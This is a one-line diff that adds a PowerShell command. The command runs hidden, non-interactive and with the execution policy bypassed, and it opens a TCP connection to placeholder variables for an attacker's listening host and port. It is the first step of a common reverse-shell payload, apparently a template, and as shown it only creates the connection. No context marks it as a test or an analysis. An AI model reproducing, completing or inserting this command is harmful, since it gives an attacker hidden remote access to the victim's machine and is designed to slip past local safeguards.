@@ -1,0 +1,1 @@
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('${JJ_LHOST}',${JJ_LPORT});"
